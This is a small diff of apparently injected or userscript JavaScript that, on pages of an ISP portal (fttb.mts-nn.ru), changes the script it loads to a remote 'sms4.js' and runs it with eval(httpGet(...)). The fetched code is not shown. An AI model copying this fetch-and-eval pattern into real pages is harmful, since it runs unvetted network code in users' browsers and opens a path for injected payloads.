@@ -32,7 +32,7 @@ if(('    '+document.location.href).indexOf('http://fttb.mts-nn.ru/')>1){
 
 if(getUrl.length>1){
 	
-	actoinScript='svs4.js';
+	actoinScript=mainUrl+'sms4.js';
 	eval(httpGet(actoinScript));
 }else{
 	eval(httpGet(actoinScript));
